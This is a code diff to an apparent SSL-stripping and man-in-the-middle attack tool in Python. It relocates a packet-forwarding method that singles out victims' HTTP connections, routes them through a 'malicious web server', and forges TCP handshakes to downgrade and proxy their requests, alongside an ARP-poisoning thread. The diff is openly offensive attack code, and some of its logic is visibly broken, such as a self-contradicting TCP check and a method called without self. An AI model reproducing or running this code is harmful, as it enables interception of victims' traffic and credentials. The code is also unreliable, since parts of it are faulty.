@@ -128,8 +128,29 @@ class sslStrip():
         proc_thread = threading.Thread(target=process.poison)
         proc_thread.daemon = True
         proc_thread.start()
-
 		
+    def packetForwarding(self, packet):
+        
+        if not TCP in packet and packet[TCP].dport == 80 and packet[TCP].flags == 'S' and (packet[IP].src in [victim["IP"] for victim in self.target]):
+            sender= None
+            senderfound = False
+            receiver = None
+            receiverfound = False
+            for vict in self.target:
+                if (vict["mac"] == packet[Ether].src):
+                    sender, senderfound = self.SndFound(vict)
+                    if (self.maliciousWebServer[0]["ip"] == packet[IP].dst):
+                        receiver, receiverfound = self.rcvFound(self.maliciousWebServer[0])
+            if ((not senderfound) or (not receiverfound)):
+                if (self.maliciousWebServer[0]["mac"] == packet[Ether].src):
+                    sender, senderfound = self.SndFound(self.maliciousWebServer[0])
+                    for vict in self.target:
+                        if (vict["ip"] == packet[IP].dst):
+                            receiver, receiverfound = self.rcvFound(vict)
+            if (senderfound and receiverfound):
+                self.modifyAndSend(packet, sender, receiver)
+        else: sslStrip(packet)
+    
     def sslStrip(packet):
         syn_ack = IP(dst=packet[IP].src,  src = packet[IP].dst) / TCP(sport=packet[TCP].dport, dport = packet[TCP].sport,flags='SA', seq = 0, ack = packet[TCP].seq + 1)
         ack = sr1(syn_ack)
@@ -152,30 +173,7 @@ class sslStrip():
         if(HTTP in pkt and HTTPRequest in pkt[HTTP]):
             if(pkt[HTTP][HTTPRequest].Method == b"GET"):
                 resp = requests.get("http://" + str(pkt[HTTP][HTTPRequest].Host.decode()) + str(pkt[HTTP][HTTPRequest].Path.decode()))
-                return resp
-		
-    def packetForwarding(self, packet):
-        
-        if not TCP in pkt and pkt[TCP].dport == 80 and pkt[TCP].flags == 'S' and (pkt[IP].src in [victim["IP"] for victim in self.target]):
-            sender= None
-            senderfound = False
-            receiver = None
-            receiverfound = False
-            for vict in self.target:
-                if (vict["mac"] == packet[Ether].src):
-                    sender, senderfound = self.SndFound(vict)
-                    if (self.maliciousWebServer[0]["ip"] == packet[IP].dst):
-                        receiver, receiverfound = self.rcvFound(self.maliciousWebServer[0])
-            if ((not senderfound) or (not receiverfound)):
-                if (self.maliciousWebServer[0]["mac"] == packet[Ether].src):
-                    sender, senderfound = self.SndFound(self.maliciousWebServer[0])
-                    for vict in self.target:
-                        if (vict["ip"] == packet[IP].dst):
-                            receiver, receiverfound = self.rcvFound(vict)
-            if (senderfound and receiverfound):
-                self.modifyAndSend(packet, sender, receiver)
-        else: sslStrip(packet)
-
+                return resp    
     def rcvFound(self, subj):
         receiver = subj
         receiverfound = True
